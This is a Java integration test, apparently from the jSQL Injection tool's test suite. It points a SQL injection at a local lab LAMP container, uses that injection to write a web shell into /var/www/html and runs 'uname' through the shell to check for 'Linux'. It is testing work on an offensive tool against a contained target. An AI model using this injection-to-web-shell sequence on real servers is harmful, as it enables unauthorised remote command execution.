View Javadoc
1   package com.test.vendor.mysql;
2   
3   import com.jsql.model.InjectionModel;
4   import com.jsql.model.exception.JSqlException;
5   import com.jsql.view.terminal.SystemOutTerminal;
6   import org.junit.jupiter.api.Assertions;
7   import org.junitpioneer.jupiter.RetryingTest;
8   
9   import java.util.UUID;
10  
11  public class MySqlWebshellLampSuiteIT extends ConcreteMySqlSuiteIT {
12      
13      @Override
14      public void setupInjection() throws Exception {
15          
16          InjectionModel model = new InjectionModel();
17          this.injectionModel = model;
18  
19          model.subscribe(new SystemOutTerminal());
20  
21          model.getMediatorUtils().getParameterUtil().initializeQueryString("http://jsql-lamp:8079/php/get2.php?id=");
22  
23          model
24          .getMediatorUtils()
25          .getConnectionUtil()
26          .withMethodInjection(model.getMediatorMethod().getQuery())
27          .withTypeRequest("GET");
28  
29          model
30          .getMediatorUtils()
31          .getPreferencesUtil()
32          .withIsStrategyBlindDisabled(true)
33          .withIsStrategyTimeDisabled(true)
34          .withIsStrategyStackedDisabled(true)
35          .withIsStrategyMultibitDisabled(true)
36          .withIsStrategyErrorDisabled(true);
37  
38          model.beginInjection();
39      }
40      
41      @RetryingTest(3)
42      public void webshell() throws JSqlException, InterruptedException {
43  
44          this.injectionModel.getResourceAccess().createWebShell("/var/www/html/", "");
45          // For coverage
46          this.injectionModel.getResourceAccess().createWebShell("/var/www/html", "http://jsql-lamp:8079/fake");
47  
48          String resultCommand = this.injectionModel.getResourceAccess().runWebShell(
49              "uname",
50              UUID.randomUUID(),
51              "http://jsql-lamp:8079/."+ this.injectionModel.getVersionJsql() +".jw.php"
52          );
53  
54          LOGGER.info("Webshell: found {} to find {}", resultCommand.trim(), "Linux");
55  
56          Assertions.assertEquals("Linux", resultCommand.trim());
57      }
58  }
